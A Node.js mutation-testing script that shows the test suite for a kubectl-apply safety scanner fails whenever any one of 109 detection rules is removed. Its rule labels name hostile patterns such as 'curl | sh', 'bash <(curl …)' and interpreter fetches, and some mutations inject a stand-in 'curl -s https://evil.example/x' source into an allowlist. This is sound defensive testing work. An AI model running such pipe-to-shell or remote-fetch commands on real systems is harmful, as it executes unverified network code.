#!/usr/bin/env node
/**
 * Mutation proof for the kind-manifest apply-safety guard (#1289, #1410).
 *
 * `tests/kind-manifest-checksum-pin.test.ts` drives
 * `scripts/lib/apply-safety-scan.mjs` over every tracked script and workflow
 * and over one fixture set per reviewer bypass class, and drives
 * `scripts/kind-manifests/pin-known-images.sh` against evasive manifests.
 * Each mutation below removes ONE rule the spec claims to enforce and
 * requires the spec to go RED; the file is then restored byte-identically
 * to its GREEN baseline (and the spec is re-run GREEN once at the end). Verdicts come from the spec's exit code
 * only — never from grepping its output.
 *
 * One mutation per bypass class the #1410 reviewer named (and per rule the
 * round-4 lexer added to close them):
 *   class 1 — fetch spellings / helpers:   M1 M2 M3
 *   class 2 — bare URLs / invokers / streams: M4 M5 M6
 *   class 3 — defeated or non-dominating checksum: M7 M8 M9 M10
 *   fail closed on the unclassifiable:      M11
 *   loopback exemption stays strict:       M12
 *   class 4 — pin-known-images evasions:    M13 M14
 *   round 5 — step shell / errexit:         M15 M16 M17 M18 M19 M20
 *   round 5 — unclassified remote fetch:    M21 … M31
 *   round 5 — pinned versions fail fast:    M32 M33 M34
 *   round 6 — loopback stays a taint source: M35 M36 M41 M42
 *   round 7 — a fetched value is never data:  M37 (heredoc expansions) M38 (no scalar exemption),
 *             M39 M40 M43 M44 (each allowlist entry), M45 (prefix match),
 *             M46 (file key ignored)
 *   round 8 — the allowlist pins where its variables get their values:
 *             M47 (source check off), M48 M49 M50 M51 (each entry blesses a remote fetch),
 *             M52 (`${!N}` indirection unflagged)
 *   round 9 — every write to a followed variable is traced or opaque:
 *             M53–M66 (one silent-write exemption per construct: read, mapfile,
 *             readarray, printf -v, getopts, for, select, coproc, ${V:=}, V[i]=,
 *             V+=, nameref, wait -p, let), M67 (quoted name), M68 (arithmetic
 *             assignment), M69 ({V}>), M70 (run-time command), M71 (let modeled),
 *             M72 (run-time variable name), M73 (implicit REPLY/MAPFILE…),
 *             M74 ($(<file)), M75 (corpus scan off), M76 (opaque dropped),
 *             M77 (trap handler), M78 M79 M80 (general walk: producer, loop
 *             redirect, nameref), M81 (quoted separator splits the command),
 *             M82 (aliases ignored), M83 (heredoc `${V:=}` not scanned),
 *             M84 (unresolved sourced file not opaque), M85 (names assembled from
 *             quotes), M86 M87 M88 M89 (positional parameters: not followed, `set`
 *             rewrite, no static call site, value reference), M90 (general walk:
 *             `set --` carries no producer)
 *   round 10 — the command word is found after any prefix, and a helper that
 *             binds a name it is given is a run-time-name write:
 *             M91 M92 M93 M94 (attached / bare redirection, assignment prefix,
 *             wrapper hide the command), M95 (non-literal command word), M96
 *             (`time -p`), M97 (`>&2` splits the command), M98 (helper body is
 *             one word), M99 (`>&2` splits a helper command), M100 (helper
 *             command not normalised), M101 (nameref target), M102 (`${!x:=}`),
 *             M103 (`eval` of a run-time string), M104–M109 (a helper that RUNS its
 *             arguments: call site not a write, `shift` ignored, `local c=$1` not
 *             followed, forwarding not followed, dispatch not unwrapped for
 *             run-time names, the text after `$( … )` read as a command)
 *
 * Each subject is checked byte-identical to its green baseline after every
 * restore, instead of re-running the spec; the spec runs green once at the end.
 *
 * Usage:  node scripts/mutation-prove-kind-manifest-apply-safety.mjs
 */

import { spawnSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { resolveSpecRunner } from './lib/ci-blocking-gate-proof.mjs';
import { mutate, restore, snapshot } from './lib/mutation-harness.mjs';
import { declareMutations, recordMutation } from './lib/prover-report.mjs';

const REPO_ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const SCANNER = resolve(REPO_ROOT, 'scripts/lib/apply-safety-scan.mjs');
const PIN_SCRIPT = resolve(REPO_ROOT, 'scripts/kind-manifests/pin-known-images.sh');
const DRILL_SCRIPT = resolve(
  REPO_ROOT,
  'packages/kn-next-operator/test/e2e/szpg/setup-profile-b.sh',
);
const KNATIVE_SCRIPT = resolve(REPO_ROOT, 'scripts/kind-manifests/apply-knative-kourier.sh');
const SPEC = 'tests/kind-manifest-checksum-pin.test.ts';

declareMutations(109);

// Every subject must exist before anything is mutated: a missing one is a
// FATAL throw here, never a run of vacuous reds.
// (Spelled out, one call per subject: the prover-lane audit binds each
// subject by its `readFileSync(NAME, …)` call.)
readFileSync(SCANNER, 'utf8');
readFileSync(PIN_SCRIPT, 'utf8');
readFileSync(DRILL_SCRIPT, 'utf8');
readFileSync(KNATIVE_SCRIPT, 'utf8');

const RUNNER = resolveSpecRunner(REPO_ROOT, SPEC);

/** True when the spec PASSED. Exit code only — never grepped output. */
function specPasses() {
  const r = spawnSync(RUNNER.command, [...RUNNER.args, ...RUNNER.runArgs(SPEC)], {
    cwd: REPO_ROOT,
    encoding: 'utf8',
  });
  return r.status === 0;
}

let caught = 0;
let decorative = 0;

// The BASELINE bytes of every subject. The spec is deterministic over them, so
// "every subject is byte-identical to its baseline" + "the baseline is GREEN"
// implies GREEN: that replaces a full spec run after each restore (which was
// half of the ~34 min wall time) without weakening the check. restore() already
// refuses a non-byte-identical restore; this also catches residue in a subject
// OTHER than the one just mutated. The spec is re-run GREEN once at the end, so
// a non-deterministic spec cannot hide behind the byte check either.
const SUBJECTS = [SCANNER, PIN_SCRIPT, DRILL_SCRIPT, KNATIVE_SCRIPT];
const baselineBytes = new Map(SUBJECTS.map((f) => [f, readFileSync(f)]));
function assertSubjectsAtBaseline(when) {
  for (const f of SUBJECTS)
    if (!readFileSync(f).equals(baselineBytes.get(f))) {
      console.error(`   FATAL: ${f} is not byte-identical to its baseline ${when}`);
      process.exit(1);
    }
}

/**
 * Applies one mutation to `file`, requires RED, restores byte-identically.
 * `extra` [anchor, replacement] pairs remove further rules in the same run,
 * for a rule that a LATER, independent rule also covers (both must go).
 */
function prove(label, file, anchor, replacement, extra = []) {
  console.log(`── ${label}`);
  assertSubjectsAtBaseline('before this mutation');
  const snap = snapshot(file);
  try {
    mutate(snap, anchor, replacement);
    for (const [a, r] of extra) mutate(snap, a, r);
    if (specPasses()) {
      console.log('   x DECORATION: the spec stayed GREEN with this rule removed');
      decorative += 1;
    } else {
      console.log('   ok went RED as required');
      caught += 1;
    }
    recordMutation();
  } finally {
    restore(snap);
  }
  assertSubjectsAtBaseline('after restore');
}

console.log('Baseline: the spec must be GREEN before anything is mutated.');
if (!specPasses()) {
  console.error(`FATAL: ${SPEC} is not green to begin with`);
  process.exit(1);
}
console.log('   ok baseline green\n');

// class 1 — fetch spellings / helpers
prove(
  'M1 class 1: fetch output flags (-o/-fsSLo/--output=/-O/wget) no longer recorded',
  SCANNER,
  '    if (!isFetch) continue;',
  '    if (!isFetch || true) continue;',
);
prove(
  'M2 class 1: helper functions no longer inlined at their call sites',
  SCANNER,
  '  walk(substituteArgs(body, argVals), st, callCtx);',
  '  void callCtx;',
);
prove(
  'M3 class 1: files a fetch writes are no longer tainted',
  SCANNER,
  '      for (const p of writtenPaths(ws, st, isFetch)) {',
  '      for (const p of []) {',
);

// class 2 — bare URLs / invokers / streams
prove(
  'M4 class 2: apply recognised only after a literal `kubectl`',
  SCANNER,
  '    if (APPLY_VERBS.has(ws[k])) {',
  "    if (APPLY_VERBS.has(ws[k]) && ws[k - 1] === 'kubectl') {",
);
prove(
  'M5 class 2: a URL (or URL variable) apply target is no longer rejected',
  SCANNER,
  '  if (URL_RE.test(c) || varRefs(raw).some((r) => st.vars.get(r)?.url)) {',
  '  if (false) {',
);
prove(
  'M6 class 2: a stdin apply fed by network content is no longer rejected',
  SCANNER,
  '    if (why) reportStdinApply(st, `stdin apply fed by network content (${why})`, clause);',
  '    void why;',
);

// class 3 — defeated or non-dominating checksum
prove(
  'M7 class 3: a checksum run without errexit (set +e / no set -e) counts',
  SCANNER,
  '      !st.errexit ||',
  '      false ||',
);
prove(
  'M8 class 3: a checksum that is not the head of its && list counts',
  SCANNER,
  "      endsChain: !['&&', '||'].includes(cl.sepAfter) && ci === chainStart,",
  "      endsChain: !['&&', '||'].includes(cl.sepAfter),",
);
prove(
  'M9 class 3: a checksum of ANY file clears every fetched file',
  SCANNER,
  '  if (hits.length > 0) {',
  '  if (hits.length > 0 && st.verified.size === 0) {',
);
prove(
  'M10 class 3: a checksum inside a control block covers applies outside it',
  SCANNER,
  "  return v.block === '' || here === v.block || here.startsWith(`${v.block}/`);",
  '  return true;',
);

// fail closed
prove(
  'M11 fail closed: a stdin apply with no producer passes',
  SCANNER,
  "      offend(st, 'unclassifiable stdin apply (no producer in this source)', clause);",
  '      void clause;',
);

// loopback exemption strictness
prove(
  'M12 loopback: a URL nested inside a loopback URL is treated as loopback',
  SCANNER,
  "  return LOOPBACK_URL.test(u) && u.split('://').length === 2 && !/\\$/.test(u.split('/')[2]);",
  "  return LOOPBACK_URL.test(u) && !/\\$/.test(u.split('/')[2]);",
);

// class 4 — pin-known-images evasions
prove(
  'M13 class 4: only the FIRST image key on a line is judged',
  PIN_SCRIPT,
  '  while [[ "$rest" =~ $image_key_re ]]; do',
  '  for _once in 1; do [[ "$rest" =~ $image_key_re ]] || break',
);
prove(
  'M14 class 4: any value merely containing "@sha256:" counts as pinned',
  PIN_SCRIPT,
  'digest_pinned() { [[ "$1" =~ ^[^[:space:]@]+@sha256:[0-9a-f]{64}$ ]]; }',
  'digest_pinned() { [[ "$1" == *@sha256:* ]]; }',
);

// round 5, finding 1 — the step's effective shell decides errexit
prove(
  'M15 shell: a custom step shell without -e (`bash {0}`) still counts as errexit',
  SCANNER,
  '  let errexit = false;',
  '  let errexit = true;',
);
prove(
  'M16 shell: workflow-level defaults.run.shell is ignored',
  SCANNER,
  '    doc?.defaults?.run?.shell ??',
  '    undefined ??',
);
prove(
  'M17 shell: job-level defaults.run.shell is ignored',
  SCANNER,
  '    job?.defaults?.run?.shell ??',
  '    undefined ??',
);
prove(
  'M18 shell: a non-POSIX step shell (pwsh/python) is scanned as bash instead of unclassifiable',
  SCANNER,
  "  if (!EXEC_STRING_SHELLS.has(ws[0].split('/').pop()) || /\\$\\{\\{/.test(s)) return null;",
  "  if (!EXEC_STRING_SHELLS.has(ws[0].split('/').pop()) || /\\$\\{\\{/.test(s)) return true;",
);
prove(
  'M19 shell: a checksum step with continue-on-error still covers later steps',
  SCANNER,
  "  if (truthyKey(step['continue-on-error'])) return false;",
  '  void truthyKey;',
);
prove(
  'M20 shell: a checksum step with an if: still covers later steps',
  SCANNER,
  '  if (step.if !== undefined) return false;',
  '  void step;',
);

// round 5, finding 2 — unclassified remote fetches
prove(
  'M21 remote: an interpreter fetching in-process (python -c urllib, node -e fetch) passes',
  SCANNER,
  "  if (INTERPRETERS.has(b) && INTERPRETER_FETCH.test(args.join(' '))) return interpreterFetch(b);",
  '  void interpreterFetch;',
);
prove(
  'M22 remote: an interpreter program fed by heredoc (node - <<JS … fetch) passes',
  SCANNER,
  '        else if (INTERPRETER_FETCH.test(body))',
  '        else if (false)',
);
prove(
  'M23 remote: git clone passes',
  SCANNER,
  "  if (b === 'git' && gitFetches(args)) return 'git fetches a remote repository';",
  '  void gitFetches;',
);
prove(
  'M24 remote: gh release download passes',
  SCANNER,
  "  if (b === 'gh' && ghDownloads(args)) return 'gh downloads a release/repo/run artifact';",
  '  void ghDownloads;',
);
prove(
  'M25 remote: helm from a remote chart URL or an added repo passes',
  SCANNER,
  "  if (b === 'helm' && helmFetches(args)) return 'helm pulls a remote chart or repo index';",
  '  void helmFetches;',
);
prove(
  'M26 remote: curl | sh / wget | bash passes',
  SCANNER,
  '  if (pipedFromNetwork && runsStdinAsCode(b, args)) return `${b} executes piped network content`;',
  '  void pipedFromNetwork;',
);
prove(
  'M27 remote: bash <(curl …) / sh -c "$(curl …)" passes',
  SCANNER,
  '  if (runsNetworkCode(b, rawArgs, st, depth)) return `${b} executes network content`;',
  '  void runsNetworkCode;',
);
prove(
  'M28 remote: a heredoc fed to ssh / docker exec / a shell is not scanned as a script',
  SCANNER,
  '          walkScript(body, st, { ...ctx, defeated: verifyDefeated, depth: ctx.depth + 1 });',
  '          void walkScript;',
);
prove(
  "M29 remote: a sourced file's functions are not followed",
  SCANNER,
  '  for (const [n, fn] of sourcedFns) if (!st.functions.has(n)) st.functions.set(n, fn);',
  '  void sourcedFns;',
);
prove(
  'M30 remote: a URL call into an unresolvable sourced file passes',
  SCANNER,
  '      if (unresolvedCallWithUrl(ws, st))',
  '      if (false)',
);
prove(
  'M31 remote: allowlist matches are no longer counted (the exactly-once check goes blind)',
  SCANNER,
  '  st.allowHits?.set(id, (st.allowHits.get(id) ?? 0) + 1);',
  '  void id;',
);

// round 5, finding 3 — pinned versions fail fast, by name
prove(
  'M32 pins: the szpg drill no longer rejects a version override up front',
  DRILL_SCRIPT,
  '  check_pinned_versions\n  preflight',
  '  preflight',
);
prove(
  'M33 pins: apply-knative-kourier.sh no longer rejects an unpinned version by name',
  KNATIVE_SCRIPT,
  'if [ "$KNATIVE_VERSION" != "$PINNED_KNATIVE_VERSION" ]; then',
  'if false; then',
);
prove(
  'M34 pins: the drill resolves REPO_ROOT one level too shallow again (packages/)',
  DRILL_SCRIPT,
  'OPERATOR_DIR="$(cd "$HERE/../../.." && pwd)"',
  'OPERATOR_DIR="$(cd "$HERE/../.." && pwd)"',
);

// round 6 — a loopback fetch is still a taint source
prove(
  'M35 loopback: a fetch whose every URL is loopback is no longer a taint source',
  SCANNER,
  '    if (!FETCH_WORDS.has(base)) continue;',
  `    if (!FETCH_WORDS.has(base)) continue;
    if (ws.some((a) => /:\\/\\//.test(a)) && ws.filter((a) => /:\\/\\//.test(a)).every(isLoopbackUrl)) continue;`,
);
prove(
  'M36 loopback: git fetch of a loopback URL is exempt from the remote-fetch rule',
  SCANNER,
  'const hasRemoteArg = (args) => args.some((a) => REMOTE_ARG_RE.test(a));',
  'const hasRemoteArg = (args) => args.some((a) => REMOTE_ARG_RE.test(a) && !isLoopbackUrl(a));',
);
prove(
  'M37 heredoc: the variables an unquoted heredoc interpolates are not consulted at all',
  SCANNER,
  '    if (hd && !hd.quoted) {',
  '    if (false) {',
);
prove(
  'M38 no scalar exemption: a fetched variable is only network content where a command emits it',
  SCANNER,
  '          if (st.vars.get(r)?.content) return `variable $${r} holds network content`;',
  '          if (st.vars.get(r)?.content && ws.some((x) => /^(echo|printf|cat)$/.test(unquote(x)))) return `variable $${r} holds network content`;',
);
prove(
  'M41 clone: a clone of a local path is flagged as remote',
  SCANNER,
  "  if (sub === 'clone') return !cloneSourceIsLocalPath(rest);",
  "  if (sub === 'clone') return true;",
);
prove(
  'M42 clone: any clone source counts as a local path',
  SCANNER,
  "  return source !== '' && !/:\\/\\//.test(source) && !/^[^/]*:/.test(source) && !/[$`]/.test(source);",
  '  return true;',
);

// round 7 — the statement allowlist: exactly four named sites, byte-exact, per file
prove(
  'M39 allowlist: the _verify-objstore.sh entry is dropped',
  SCANNER,
  "    file: 'packages/scale-zero-pg/deploy/_verify-objstore.sh',",
  "    file: 'packages/scale-zero-pg/deploy/dropped.sh',",
);
prove(
  'M40 allowlist: the _verify-restore.sh entry is dropped',
  SCANNER,
  "    file: 'packages/scale-zero-pg/deploy/_verify-restore.sh',",
  "    file: 'packages/scale-zero-pg/deploy/dropped.sh',",
);
prove(
  'M43 allowlist: the _verify-app-restore.sh entry is dropped',
  SCANNER,
  "    file: 'packages/scale-zero-pg/deploy/_verify-app-restore.sh',",
  "    file: 'packages/scale-zero-pg/deploy/dropped.sh',",
);
prove(
  'M44 allowlist: the _restore-writable.sh entry is dropped',
  SCANNER,
  "    file: 'packages/scale-zero-pg/deploy/_restore-writable.sh',",
  "    file: 'packages/scale-zero-pg/deploy/dropped.sh',",
);
prove(
  'M45 allowlist: an entry matches by PREFIX instead of the whole statement',
  SCANNER,
  'e.file === st.file && e.statement === stmt',
  'e.file === st.file && stmt.startsWith(e.statement.slice(0, 60))',
);
prove(
  'M46 allowlist: an entry is honoured in ANY file (the file key is ignored)',
  SCANNER,
  'e.file === st.file && e.statement === stmt',
  'e.statement === stmt',
);

// round 8 — the allowlist pins where the interpolated variables get their values
prove(
  'M47 allowlist: the producer/source check is off (the statement text alone decides)',
  SCANNER,
  '    if (extra.length > 0) {',
  '    if (false) {',
);
for (const [n, id] of [
  ['M48', 'lsn-inject-objstore'],
  ['M49', 'lsn-inject-restore'],
  ['M50', 'lsn-inject-app-restore'],
  ['M51', 'ctl-seed-heredoc'],
]) {
  prove(
    `${n} allowlist: the ${id} entry blesses a remote fetch as a source of its variables`,
    SCANNER,
    '    const allowed = new Set(entry.sources);',
    `    const allowed = new Set(entry.id === '${id}' ? [...entry.sources, 'fetch:curl -s https://evil.example/x', 'url:https://evil.example/x', 'urlvar:$_ctl'] : entry.sources);`,
  );
}
prove(
  'M52 heredoc: `${!N}` indirection of a fetched variable is not flagged',
  SCANNER,
  '      if (/\\$\\{![A-Za-z_]/.test(hd.body)) {',
  '      if (false) {',
);

// round 9 — every write to a followed variable is traced or opaque. Each
// construct gets a mutation that lets THAT construct write silently (an
// exemption in the occurrence scan); the spec must notice every one.
const OCCURRENCE_SCAN = "    if (!flagged && before.endsWith('-')) continue;\n";
for (const [n, construct, predicate] of [
  ['M53', '`read V`', '/(^|\\s)read\\s/.test(commandPrefix(before))'],
  ['M54', '`mapfile V`', '/(^|\\s)mapfile\\s/.test(commandPrefix(before))'],
  ['M55', '`readarray V`', '/(^|\\s)readarray\\s/.test(commandPrefix(before))'],
  ['M56', '`printf -v V`', '/(^|\\s)printf\\s/.test(commandPrefix(before))'],
  ['M57', '`getopts o V`', '/(^|\\s)getopts\\s/.test(commandPrefix(before))'],
  ['M58', '`for V in …`', '/(^|\\s)for\\s+$/.test(commandPrefix(before))'],
  ['M59', '`select V in …`', '/(^|\\s)select\\s+$/.test(commandPrefix(before))'],
  ['M60', '`coproc V { … }`', '/(^|\\s)coproc\\s+$/.test(commandPrefix(before))'],
  ['M61', '`${V:=…}` / `${V=…}`', '/\\$\\{$/.test(before) && /^:?=/.test(after)'],
  ['M62', '`V[i]=…`', '/^\\[/.test(after)'],
  ['M63', '`V+=…`', '/^\\+=/.test(after)'],
  ['M64', '`declare -n R=V` (nameref target)', 'NAMEREF_FLAG.test(commandPrefix(before))'],
  ['M65', '`wait -p V`', '/(^|\\s)wait\\s/.test(commandPrefix(before))'],
  ['M66', '`let V=…`', '/(^|\\s)let\\s+$/.test(commandPrefix(before))'],
]) {
  prove(
    `${n} write sites: ${construct} writes a followed variable without a trace`,
    SCANNER,
    OCCURRENCE_SCAN,
    `${OCCURRENCE_SCAN}    if (${predicate}) continue;\n`,
  );
}
prove(
  'M67 write sites: a quoted name (`read "V"`) is treated as prose',
  SCANNER,
  '      if (!opensHere) continue;',
  '      continue;',
);
prove(
  'M68 write sites: an arithmetic assignment (`(( V = … ))`) is treated as a read',
  SCANNER,
  "        /(\\+\\+|--)\\s*$/.test(before)\n      )\n        out.push({ kind: 'other', snippet });",
  '        /(\\+\\+|--)\\s*$/.test(before)\n      )\n        void 0;',
);
prove(
  'M69 write sites: a `{V}>file` descriptor binding is not a write',
  SCANNER,
  '    if (!flagged && /\\{$/.test(before) && /^\\}\\s*[<>]/.test(after)) {',
  '    if (false) {',
);
prove(
  'M70 write sites: a run-time command word (`$cmd V`) cannot bind a name',
  SCANNER,
  '  return SHELL_COMMANDS.has(cmd) || RUNTIME.test(ws[0]);',
  '  return SHELL_COMMANDS.has(cmd);',
);
prove(
  'M71 write sites: `let` counts as a modeled `NAME=` assignment',
  SCANNER,
  '(?:(?:export|local|declare|readonly|typeset)(?:\\s+-[A-Za-z]+)*\\s+)?(?:[A-Za-z_]',
  '(?:(?:export|local|declare|readonly|typeset|let)(?:\\s+-[A-Za-z]+)*\\s+)?(?:[A-Za-z_]',
);
prove(
  'M72 run-time names: a write through a computed variable name is not detected',
  SCANNER,
  'export function dynamicNameWrites(text, dispatchers = new Map()) {\n  const out = [];\n',
  'export function dynamicNameWrites(text, dispatchers = new Map()) {\n  const out = [];\n  if (text) return out;\n',
);
prove(
  'M73 implicit variables: REPLY / MAPFILE / … are ordinary unassigned variables',
  SCANNER,
  'const IMPLICIT_VARS = new Set([',
  'const IMPLICIT_VARS = new Set([]);\nconst _R9_UNUSED = new Set([',
);
prove(
  'M74 `$(<file)` is not a read of file (unlike `$(cat file)`)',
  SCANNER,
  "w[i] === '$' && /^\\s*<(?![<(])/.test(inner) ? inner.replace(/^\\s*</, 'cat ') : inner,",
  'inner,',
);
prove(
  'M75 source pin: only the walk-time value is followed, not every write site in the corpus',
  SCANNER,
  '    for (const site of corpusWriteSites(r, st)) {',
  '    for (const site of []) {',
);
prove(
  'M76 source pin: an unmodeled write site is dropped instead of reported opaque',
  SCANNER,
  '        out.add(`opaque:$${r} is written by \\`${site.snippet}\\``);',
  '        void site;',
);
prove(
  'M77 corpus: a `trap` handler string is not scanned for writes',
  SCANNER,
  '    st.corpus.push(m[1] ?? m[2]);',
  '    void m;',
);
prove(
  'M78 general walk: a non-`NAME=` write does not carry its producer',
  SCANNER,
  '    bindUnmodeledWrites(text, loopTailOf(clauses, ci), st, ctx.depth);',
  '    void loopTailOf;',
);
prove(
  'M79 general walk: `while read V … done < <(fetch)` ignores the loop redirect',
  SCANNER,
  '    bindUnmodeledWrites(text, loopTailOf(clauses, ci), st, ctx.depth);',
  "    bindUnmodeledWrites(text, '', st, ctx.depth);",
);
prove(
  'M80 general walk: a nameref (`declare -n R=V`) is an ordinary literal assignment',
  SCANNER,
  '    if (nameref) {',
  '    if (false) {',
);

prove(
  'M81 write sites: a separator INSIDE quotes (`read -d ";" V`) splits the command (with the round-10 non-literal-command rule, which also catches the mis-split `b" ` head, removed too)',
  SCANNER,
  "    if (frames && frames[m.index] !== 'code' && frames[m.index] !== 'bq') continue;",
  '    if (false) continue;',
  [
    [
      '  if (!RUNTIME.test(ws[0]) && !PLAIN_COMMAND.test(cmd)) return true;',
      '  if (false) return true;',
    ],
  ],
);
prove(
  'M82 run-time names: an alias (`alias rd=read; rd V`) is not treated as a possible writer',
  SCANNER,
  '  if (/(^|[\\s;&|(])alias\\s+[^\\s=]+=|\\bexpand_aliases\\b/.test(text))',
  '  if (false)',
);

prove(
  'M83 write sites: a heredoc-body V:= default in an unquoted heredoc is not seen',
  SCANNER,
  '    if (hd.quoted) continue;',
  '    continue;',
);
prove(
  'M84 source pin: a sourced file the resolver cannot read is assumed to write nothing',
  SCANNER,
  '    if (st.unresolvedSource !== null)\n      out.add(',
  '    if (false)\n      out.add(',
);

prove(
  'M85 write sites: a name assembled from quoted pieces (`printf -v V"AR"`) is not compared dequoted',
  SCANNER,
  '      if (dq !== w) out.push({ raw: w, dq, head: ws, snippet: seg.trim().slice(0, 100) });',
  '      void dq;',
);
prove(
  'M86 positional parameters: a write from $1… is not followed to where $1 comes from',
  SCANNER,
  '      if (m && hasPositional(m[1])) positionalSources(site.word, r, st, depth, ctx);',
  '      void hasPositional;',
);
prove(
  'M87 positional parameters: a `set --` rewrite is not opaque',
  SCANNER,
  '  if (st.corpus.some(setsPositionals))',
  '  if (false)',
);
prove(
  'M88 positional parameters: a helper with no static call site is assumed to write nothing',
  SCANNER,
  '    if (calls === 0)',
  '    if (false)',
);
prove(
  'M89 positional parameters: a helper referenced as a value (`h=F; "$h" …`) is traced as if called statically',
  SCANNER,
  '        if (/=["\']?$/.test(t.slice(from, m.index)) || /^\\s*(for|select)\\s/.test(line)) {',
  '        if (false) {',
);
prove(
  'M90 general walk: `set -- "$(fetch)"` leaves $1… untainted',
  SCANNER,
  "      (!!st.vars.get('@')?.content && hasPositional(value));",
  '      false;',
);

// round 10 — the command word is found after any prefix (root cause 1), and a
// helper that binds a name it is GIVEN is a run-time-name write (root cause 2).
prove(
  'M91 command word: an attached redirection prefix (`2>/dev/null read`) hides the command',
  SCANNER,
  String.raw`    else if (REDIR_ATTACHED.test(w) && !/^<\(/.test(w)) out.shift();`,
  String.raw`    else if (REDIR_ATTACHED.test(w) && !/^<\(/.test(w)) return out;`,
);
prove(
  'M92 command word: a bare redirection operator (`< f read`) hides the command',
  SCANNER,
  '    else if (REDIR_BARE.test(w)) out.splice(0, 2);',
  '    else if (REDIR_BARE.test(w)) return out;',
);
prove(
  'M93 command word: an assignment prefix (`IFS=, read`) hides the command',
  SCANNER,
  String.raw`    else if (/^[A-Za-z_]\w*(\[[^\]]*\])?\+?=/.test(w)) out.shift();`,
  String.raw`    else if (/^[A-Za-z_]\w*(\[[^\]]*\])?\+?=/.test(w)) return out;`,
);
prove(
  'M94 command word: a pass-through wrapper (`builtin printf -v`) hides the command',
  SCANNER,
  '    else if (WRAPPER_OPTS.has(u)) {',
  '    else if (false) {',
);
prove(
  'M95 command word: a non-literal command word (`{read,-r} V`) cannot bind a name',
  SCANNER,
  '  if (!RUNTIME.test(ws[0]) && !PLAIN_COMMAND.test(cmd)) return true;',
  '  if (false) return true;',
);
prove(
  'M96 command word: `time -p` leaves `-p` as the command',
  SCANNER,
  String.raw`time(?:\s+(?:-p|--))*)\s+)*/;`,
  String.raw`time)\s+)*/;`,
);
prove(
  'M97 write sites: the `&` of `>&2` splits the command (`>&2 read V`)',
  SCANNER,
  '    if (isRedirectionChar(before, m.index)) continue;',
  '    if (false) continue;',
);
prove(
  'M98 run-time names: a helper body (`f() { printf -v "$1" …; }`) is one word headed by `f()`',
  SCANNER,
  String.raw`    if (!/[;\n&|(){}]/.test(c) || isRedirectionChar(text, i)) return undefined;`,
  String.raw`    if (!/[;\n&|]/.test(c) || isRedirectionChar(text, i)) return undefined;`,
);
prove(
  'M99 run-time names: the `&` of `>&2` splits a helper command (`>&2 read "$1"`)',
  SCANNER,
  String.raw`    if (!/[;\n&|(){}]/.test(c) || isRedirectionChar(text, i)) return undefined;`,
  String.raw`    if (!/[;\n&|(){}]/.test(c)) return undefined;`,
);
prove(
  'M100 run-time names: the command word is not normalised (`2>/dev/null read -r "$1"`)',
  SCANNER,
  '    const raw = dispatchedCommand(commandHead(words(seg)), dispatchers);',
  '    const raw = dispatchedCommand(words(seg), dispatchers);',
);
prove(
  'M101 run-time names: a nameref whose target is run-time or bound later is not one',
  SCANNER,
  '        else if (nameref && (',
  '        else if (false && nameref && (',
);
prove(
  'M102 run-time names: an indirect `:=` default (through `!x`) assigning a run-time name is not one',
  SCANNER,
  String.raw`  if (/\$\{![\w@*#?$-]+(?:\[[^\]]*\])?:?=/.test(text))`,
  '  if (false)',
);
prove(
  'M103 run-time names: `eval "read -r $1"` in a helper is not one',
  SCANNER,
  "    if (cmd === 'eval') {\n",
  '    if (false) {\n',
);

prove(
  'M104 dispatchers: a call of a helper that runs its arguments (`quiet read V`) is not a write',
  SCANNER,
  '  if (dispatchers.has(cmd)) {\n    const idx = dispatchers.get(cmd);',
  '  if (false) {\n    const idx = dispatchers.get(cmd);',
);
prove(
  'M105 dispatchers: `shift` does not move the dispatch index (`retry 3 read V` runs `3`)',
  SCANNER,
  '          shifts += ws.length === 1 ? 1 : /^[0-9]+$/.test(ws[1]) ? Number(ws[1]) : Number.NaN;',
  '          shifts += 0;',
);
prove(
  'M106 dispatchers: a command word set from a positional (`local c=$1; $c`) is not followed',
  SCANNER,
  '            if (refs.length > 0) idx = refs.length === 1 ? assigned.get(refs[0]) : 0;',
  '            void refs;',
);
prove(
  'M107 dispatchers: a helper forwarding its positionals to a dispatcher is not one',
  SCANNER,
  '        } else if (out.has(cmd) && ws.slice(1).some((a) => POSITIONAL.test(a))) idx = 0;',
  '        } else if (false) idx = 0;',
);
prove(
  'M108 run-time names: a dispatcher call (`quiet read "$n"`) is not unwrapped to its command',
  SCANNER,
  '    const raw = dispatchedCommand(commandHead(words(seg)), dispatchers);',
  '    const raw = commandHead(words(seg));',
);
prove(
  'M109 command pieces: the text after a closing `$( … )` is read as a new command',
  SCANNER,
  "    continuation = c === '}' || (c === ')' && d > 0);",
  '    continuation = false;',
);

// Every subject is byte-identical to its green baseline (checked after each
// restore); one final run proves the spec itself did not drift.
assertSubjectsAtBaseline('at the end');
if (!specPasses()) {
  console.error(`   FATAL: ${SPEC} is not green after the last restore`);
  process.exit(1);
}

console.log(`\n${caught} caught, ${decorative} undetected.`);
if (decorative > 0) {
  console.error(
    'At least one apply-safety rule is decoration — the spec does not notice it removed.',
  );
  process.exit(1);
}
